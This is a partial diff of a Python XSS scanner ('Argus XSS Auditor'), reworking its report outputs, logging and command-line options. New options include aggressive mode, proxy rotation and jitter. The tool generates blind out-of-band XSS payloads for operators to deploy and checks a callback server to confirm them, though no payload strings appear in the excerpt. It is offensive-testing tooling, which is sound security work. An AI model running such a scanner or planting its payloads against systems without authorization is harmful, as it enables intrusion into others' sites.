+            _save_evidence(f, "", evidence_dir)
 
-    # ── Outputs
+    # Flat outputs
     (outdir / "xss_candidates.txt").write_text(
         "\n".join(
-            f"{f.target}\t{f.param}\t{f.xss_type}\t{f.context}\t{f.severity}\t"
+            f"{f.target}\t{f.param}\t{f.xss_type}\t{f.context}\t{f.severity.value}\t"
             f"{f.confidence}\t{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
             for f in deduped
         ) + ("\n" if deduped else "")
@@ -2255,15 +2315,11 @@ def run_xss_scan(
         "\n".join(
             f"{f.details.get('js_url', f.target)}\t"
             f"{f.details.get('source', '')}\t"
-            f"{f.details.get('sink', '')}\t"
-            f"{f.evidence[:120]}"
+            f"{f.details.get('sink', '')}\t{f.evidence[:120]}"
             for f in dom_list
         ) + ("\n" if dom_list else "")
     )
 
-    # Blind OOB payloads — raw generation list for manual deployment.
-    # Each row is (target, param, token, payload) so operators can match
-    # a payload back to a Huginn token during triage.
     (outdir / "xss_blind.txt").write_text(
         "\n".join(
             f"{b['target']}\t{b['param']}\t{b['oob_token']}\t{b['payload']}"
@@ -2271,13 +2327,10 @@ def run_xss_scan(
         ) + ("\n" if blind_payloads else "")
     )
 
-    # CSP surfaces — kept in the original 4-column shape for downstream
-    # readers. We pull them out of deduped[] since analyze_csp() now emits
-    # proper XSSFinding objects.
     csp_list = [f for f in deduped if f.xss_type == "csp"]
     (outdir / "xss_csp.txt").write_text(
         "\n".join(
-            f"{f.target}\t{f.payload}\t{f.severity}\t{f.evidence[:120]}"
+            f"{f.target}\t{f.payload}\t{f.severity.value}\t{f.evidence[:120]}"
             for f in csp_list
         ) + ("\n" if csp_list else "")
     )
@@ -2285,7 +2338,8 @@ def run_xss_scan(
     blind_findings = [f for f in deduped if f.xss_type == "blind"]
     blind_confirmed = [f for f in blind_findings if f.confirmed]
 
-    # ── JSON report ────────────────────────────────────────────────────────
+    # ── Full report
+    json_path = outdir / "xss_findings.json"
     report = {
         "schema_version": FINDING_SCHEMA_VERSION,
         "generated_at":   datetime.now(timezone.utc).isoformat(),
@@ -2293,37 +2347,30 @@ def run_xss_scan(
         "input_file":     str(urls_file),
         "scan_id":        scan_id,
         "interrupted":    interrupted,
+        "aggressive":     aggressive,
         "config": {
-            "test_stored":   test_stored,
-            "test_dom":      test_dom,
+            "test_stored":   test_stored, "test_dom": test_dom,
             "test_headers":  test_headers,
-            "oob_mode":      oob["mode"],
-            "oob_base_url":  oob["base_url"],
-            "authenticated": auth_on,
-            "max_surfaces":  eff_max,
-            "rate_limit":    eff_rate,
-            "concurrency":   eff_conc,
-            "timeout":       eff_timeout,
+            "oob_mode":      oob["mode"], "oob_base_url": oob["base_url"],
+            "authenticated": auth_on, "max_surfaces": eff_max,
+            "rate_limit":    eff_rate, "jitter": eff_jitter,
+            "concurrency":   eff_conc, "timeout": eff_timeout,
+            "proxies":       len(eff_proxies),
             "verify_tls":    verify_tls,
         },
         "totals": {
-            "urls_input":      len(urls),
-            "surfaces_tested": len(surfaces),
-            "total_findings":  len(deduped),
-            "confirmed":       len(confirmed_list),
+            "urls_input":      len(urls), "surfaces_tested": len(surfaces),
+            "total_findings":  len(deduped), "confirmed": len(confirmed_list),
             "blind_findings":  len(blind_findings),
             "blind_confirmed": len(blind_confirmed),
             "blind_payloads":  len(blind_payloads),
-            "dom_findings":    len(dom_list),
-            "csp_surfaces":    len(csp_list),
-            "critical":        by_severity.get("CRITICAL", 0),
-            "high":            by_severity.get("HIGH", 0),
-            "medium":          by_severity.get("MEDIUM", 0),
-            "low":             by_severity.get("LOW", 0),
-            "info":            by_severity.get("INFO", 0),
+            "dom_findings":    len(dom_list), "csp_surfaces": len(csp_list),
+            "critical":        by_sev["CRITICAL"], "high": by_sev["HIGH"],
+            "medium":          by_sev["MEDIUM"], "low": by_sev["LOW"],
+            "info":            by_sev["INFO"],
         },
         "summary": {
-            "by_severity": by_severity,
+            "by_severity": by_sev,
             "by_type":     dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
             "by_context":  dict(sorted(by_context.items(), key=lambda kv: -kv[1])),
             "waf_hits":    waf_seen,
@@ -2331,60 +2378,69 @@ def run_xss_scan(
         "results":        results,
         "findings":       [f.to_dict() for f in deduped],
         "blind_payloads": blind_payloads,
-        # Backwards-compat block for readers that expect the old shape.
-        "csp_surfaces": [
-            {
-                "target":   f.target,
-                "surface":  f.payload,
-                "severity": f.severity,
-                "evidence": f.evidence,
-            }
-            for f in csp_list
-        ],
     }
-
-    json_path = outdir / "xss_findings.json"
     json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
 
-    # ── DB self-sync (post-scan) ───────────────────────────────────────────
+    # ── Confirmed-only report
+    confirmed_high = [f for f in deduped if f.severity.rank >= Severity.HIGH.rank]
+    (outdir / "xss_confirmed.json").write_text(
+        json.dumps({
+            "schema_version": FINDING_SCHEMA_VERSION,
+            "generated_at": datetime.now(timezone.utc).isoformat(),
+            "input_file": str(urls_file),
+            "totals": {
+                "confirmed": len(confirmed_high),
+                "critical":  sum(1 for f in confirmed_high if f.severity == Severity.CRITICAL),
+                "high":      sum(1 for f in confirmed_high if f.severity == Severity.HIGH),
+                "blind_confirmed": len(blind_confirmed),
+                "by_chain":  {cid: sum(1 for f in confirmed_high if cid in f.chain_ids)
+                              for cid in {x for f in confirmed_high for x in f.chain_ids}},
+            },
+            "findings": [f.to_dict() for f in confirmed_high],
+        }, indent=2, ensure_ascii=False) + "\n"
+    )
+
+    # ── Chains
+    (outdir / "xss_chains.json").write_text(
+        json.dumps({
+            "generated_at": datetime.now(timezone.utc).isoformat(),
+            "chains": [c.to_dict() for c in chains],
+        }, indent=2, ensure_ascii=False) + "\n"
+    )
+
     if scan_id is not None:
         _self_sync(scan_id, deduped)
     else:
         log.debug("  DB sync: no --scan-id provided, skipping")
 
-    # ── Optional inline OOB verification ───────────────────────────────────
     if (oob_poll_wait > 0 and blind_findings and not blind_confirmed
             and oob["base_url"]):
         log.info("")
         log.info(f"  OOB verification (polling up to {oob_poll_wait}s/token)...")
         try:
-            verify_blind_findings(
-                outdir,
-                oob_base_url=oob["base_url"],
-                read_key=oob["read_key"] or None,
-                max_wait=oob_poll_wait,
-                scan_id=scan_id,
-            )
+            verify_blind_findings(outdir, oob_base_url=oob["base_url"],
+                                  read_key=oob["read_key"] or None,
+                                  max_wait=oob_poll_wait, scan_id=scan_id)
         except Exception as e:
             log.warning(f"    OOB verification failed: {type(e).__name__}: {e}")
 
-    # ── CLI summary ────────────────────────────────────────────────────────
     log.info("")
     log.info("  Outputs :")
-    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
+    log.info(f"    xss_findings.json            {len(deduped):>5} finding(s)")
+    log.info(f"    xss_confirmed.json           {len(confirmed_high):>5} confirmed (HIGH+)")
+    log.info(f"    xss_chains.json              {len(chains):>5} chain(s)")
     log.info(f"    xss_candidates.txt           {len(deduped):>5} candidate(s)")
-    log.info(f"    xss_confirmed.txt            {len(confirmed_list):>5} confirmed")
+    log.info(f"    xss_confirmed.txt            {len(confirmed_refl):>5} reflected/stored/header")
     log.info(f"    xss_dom.txt                  {len(dom_list):>5} DOM finding(s)")
     log.info(f"    xss_blind.txt                {len(blind_payloads):>5} blind payload(s)")
     log.info(f"    xss_csp.txt                  {len(csp_list):>5} CSP surface(s)")
+    if confirmed_high:
+        log.info(f"    xss_evidence/                {len(confirmed_list):>5} evidence file(s)")
 
     log.info("")
     log.info(
-        f"  Severity : CRITICAL={by_severity.get('CRITICAL', 0)}  "
-        f"HIGH={by_severity.get('HIGH', 0)}  "
-        f"MEDIUM={by_severity.get('MEDIUM', 0)}  "
-        f"LOW={by_severity.get('LOW', 0)}  "
-        f"INFO={by_severity.get('INFO', 0)}"
+        f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
+        f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}"
     )
     if by_type:
         log.info("  Type     : " + " · ".join(f"{k}({v})" for k, v in by_type.items()))
@@ -2392,29 +2448,29 @@ def run_xss_scan(
         log.info("  Context  : " + " · ".join(f"{k}({v})" for k, v in by_context.items()))
     if waf_seen:
         log.info("  WAF      : " + " · ".join(f"{k}({v})" for k, v in waf_seen.items()))
+    if chains:
+        log.info("  Chains   : " + " · ".join(
+            f"{c.chain_id}({c.severity.value})" for c in chains
+        ))
 
     if blind_findings:
         log.info("")
-        log.info(
-            f"  Blind OOB: {len(blind_findings)} candidate(s), "
-            f"{len(blind_confirmed)} confirmed via callback"
-        )
+        log.info(f"  Blind OOB: {len(blind_findings)} candidate(s), "
+                 f"{len(blind_confirmed)} confirmed via callback")
         if blind_payloads and not blind_confirmed:
             log.info("    Deploy payloads from xss_blind.txt, then run:")
-            log.info(
-                "      python -m auditing_tools.xss_finder "
-                f"--verify-oob --oob-poll-wait 120"
-                + (f" --scan-id {scan_id}" if scan_id else "")
-            )
+            log.info(f"      python -m auditing_tools.xss_finder --verify-oob "
+                     f"--oob-poll-wait 120"
+                     + (f" --scan-id {scan_id}" if scan_id else ""))
 
-    if confirmed_list:
+    if confirmed_high:
         log.info("")
         log.info("  Confirmed findings (top 10):")
-        for f in confirmed_list[:10]:
-            log.info(
-                f"    [{f.severity:<8}] {f.xss_type:<10} {f.context:<20} "
-                f"{f.param:<16} {_redact_url(f.target, 50)}"
-            )
+        for f in confirmed_high[:10]:
+            tag = f" [{','.join(f.chain_ids)}]" if f.chain_ids else ""
+            log.info(f"    [{f.severity.value:<8}] {f.xss_type:<10} "
+                     f"{f.context:<20} {f.param:<16} "
+                     f"{_redact_url(f.target, 50)}{tag}")
 
     if interrupted:
         log.info("")
@@ -2425,14 +2481,13 @@ def run_xss_scan(
     return json_path
 
 
-def _write_empty_report(outdir: Path, input_file: Path, start: float) -> Path:
+def _write_empty(outdir: Path, input_file: Path, start: float) -> Path:
     outdir.mkdir(parents=True, exist_ok=True)
     report = {
         "schema_version": FINDING_SCHEMA_VERSION,
         "generated_at":   datetime.now(timezone.utc).isoformat(),
         "elapsed_seconds": round(time.monotonic() - start, 2),
-        "input_file":     str(input_file),
-        "config":         {},
+        "input_file":     str(input_file), "config": {}, "aggressive": False,
         "totals": {
             "urls_input": 0, "surfaces_tested": 0, "total_findings": 0,
             "confirmed": 0, "blind_findings": 0, "blind_confirmed": 0,
@@ -2440,16 +2495,25 @@ def _write_empty_report(outdir: Path, input_file: Path, start: float) -> Path:
             "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
         },
         "summary": {"by_severity": {}, "by_type": {}, "by_context": {}},
-        "results": [],
-        "findings": [],
-        "blind_payloads": [],
-        "csp_surfaces": [],
+        "results": [], "findings": [], "blind_payloads": [],
     }
     path = outdir / "xss_findings.json"
     path.write_text(json.dumps(report, indent=2) + "\n")
+    (outdir / "xss_confirmed.json").write_text(json.dumps({
+        "schema_version": FINDING_SCHEMA_VERSION,
+        "generated_at": datetime.now(timezone.utc).isoformat(),
+        "input_file": str(input_file),
+        "totals": {"confirmed": 0, "critical": 0, "high": 0,
+                   "blind_confirmed": 0, "by_chain": {}},
+        "findings": [],
+    }, indent=2) + "\n")
+    (outdir / "xss_chains.json").write_text(json.dumps({
+        "generated_at": datetime.now(timezone.utc).isoformat(), "chains": [],
+    }, indent=2) + "\n")
     for name in ("xss_candidates.txt", "xss_confirmed.txt", "xss_dom.txt",
                  "xss_blind.txt", "xss_csp.txt"):
         (outdir / name).write_text("")
+    (outdir / "xss_evidence").mkdir(exist_ok=True)
     return path
 
 
@@ -2458,11 +2522,8 @@ def _write_empty_report(outdir: Path, input_file: Path, start: float) -> Path:
 # ═════════════════════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
-    logging.basicConfig(
-        level=logging.INFO,
-        format="%(message)s",
-        handlers=[logging.StreamHandler(sys.stdout)],
-    )
+    logging.basicConfig(level=logging.INFO, format="%(message)s",
+                        handlers=[logging.StreamHandler(sys.stdout)])
     base = Path(__file__).resolve().parent.parent
     default_input = base / "output" / "gf_xss.txt"
     if not default_input.exists():
@@ -2471,35 +2532,28 @@ if __name__ == "__main__":
         default_input = base / "output" / "all_urls.txt"
     out = base / "output"
 
-    parser = argparse.ArgumentParser(
-        description="Argus XSS Auditor v4.0 (standalone)"
-    )
+    parser = argparse.ArgumentParser(description="Argus XSS Auditor v5.0")
     parser.add_argument("--input", type=Path, default=default_input)
     parser.add_argument("--output", type=Path, default=out)
-    parser.add_argument("--cookie", help="Session cookie (shortcut for --header Cookie=...)")
+    parser.add_argument("--cookie", help="Session cookie")
     parser.add_argument("--header", action="append", default=[],
-                        metavar="NAME=VALUE",
-                        help="Extra header (repeatable, e.g. --header 'Authorization=Bearer xxx')")
-    parser.add_argument("--oob-domain",
-                        help="OOB domain (Huginn). Path or subdomain form.")
-    parser.add_argument("--oob-mode", choices=["path", "subdomain"], default=None,
-                        help="Huginn payload mode (default: config OAST_MODE or 'path')")
+                        metavar="NAME=VALUE", help="Extra header (repeatable)")
+    parser.add_argument("--oob-domain", help="OOB domain (Huginn)")
+    parser.add_argument("--oob-mode", choices=["path", "subdomain"], default=None)
     parser.add_argument("--no-stored", action="store_true")
     parser.add_argument("--no-dom", action="store_true")
-    parser.add_argument("--test-headers", action="store_true",
-                        help="Test HTTP header reflection (opt-in, slow)")
+    parser.add_argument("--test-headers", action="store_true")
+    parser.add_argument("--aggressive", action="store_true")
     parser.add_argument("--max-surfaces", type=int, default=None)
-    parser.add_argument("--concurrency",   type=int, default=None)
-    parser.add_argument("--rate-limit",    type=int, default=None)
-    parser.add_argument("--timeout",       type=int, default=None)
-    parser.add_argument("--scan-id",       type=int, default=None,
-                        help="DB scan ID for self-sync")
+    parser.add_argument("--concurrency", type=int, default=None)
+    parser.add_argument("--rate-limit", type=int, default=None)
+    parser.add_argument("--timeout", type=int, default=None)
+    parser.add_argument("--proxies", default=None)
+    parser.add_argument("--scan-id", type=int, default=None)
     parser.add_argument("--verify-oob", action="store_true",
                         help="Standalone mode: only poll Huginn for existing "
                              "blind findings and update xss_findings.json")
-    parser.add_argument("--oob-poll-wait", type=int, default=0,
-                        help="Poll OOB for N seconds per token after the scan "
-                             "(0 = single pass)")
+    parser.add_argument("--oob-poll-wait", type=int, default=0)
     args = parser.parse_args()
 
     headers: dict[str, str] = {}
@@ -2510,24 +2564,20 @@ if __name__ == "__main__":
     if args.cookie:
         headers["Cookie"] = args.cookie
 
+    proxies = args.proxies.split(",") if args.proxies else None
+
     try:
         if args.verify_oob:
             oob = _oob_settings()
             base_url = oob["base_url"]
             if args.oob_domain:
-                base_url = (
-                    args.oob_domain
-                    if args.oob_domain.startswith(("http://", "https://"))
-                    else f"https://{args.oob_domain}"
-                ).rstrip("/")
+                base_url = (args.oob_domain if args.oob_domain.startswith(
+                    ("http://", "https://")) else f"https://{args.oob_domain}").rstrip("/")
             if not base_url:
-                log.error(
-                    "--verify-oob requires OOB config (OAST_DOMAIN) or --oob-domain"
-                )
+                log.error("--verify-oob requires OAST_DOMAIN or --oob-domain")
                 sys.exit(2)
             result = verify_blind_findings(
-                args.output,
-                oob_base_url=base_url,
+                args.output, oob_base_url=base_url,
                 read_key=oob["read_key"] or None,
                 max_wait=max(args.oob_poll_wait, 0),
                 scan_id=args.scan_id,
@@ -2537,21 +2587,18 @@ if __name__ == "__main__":
             run_xss_scan(
                 args.input, args.output,
                 headers=headers or None,
-                oob_domain=args.oob_domain,
-                oob_mode=args.oob_mode,
-                test_stored=not args.no_stored,
-                test_dom=not args.no_dom,
+                oob_domain=args.oob_domain, oob_mode=args.oob_mode,
+                test_stored=not args.no_stored, test_dom=not args.no_dom,
                 test_headers=args.test_headers,
+                aggressive=args.aggressive,
                 max_surfaces=args.max_surfaces,
-                concurrency=args.concurrency,
-                rate_limit=args.rate_limit,
-                timeout=args.timeout,
-                scan_id=args.scan_id,
-                oob_poll_wait=args.oob_poll_wait,
+                concurrency=args.concurrency, rate_limit=args.rate_limit,
+                timeout=args.timeout, proxies=proxies,
+                scan_id=args.scan_id, oob_poll_wait=args.oob_poll_wait,
             )
     except KeyboardInterrupt:
         log.warning("interrupted by user")
         sys.exit(130)
     except Exception as e:
         log.error(f"failed: {type(e).__name__}: {e}")
-        sys.exit(1)
+        import traceback; log.debug(traceback.format_exc()); sys.exit(1)
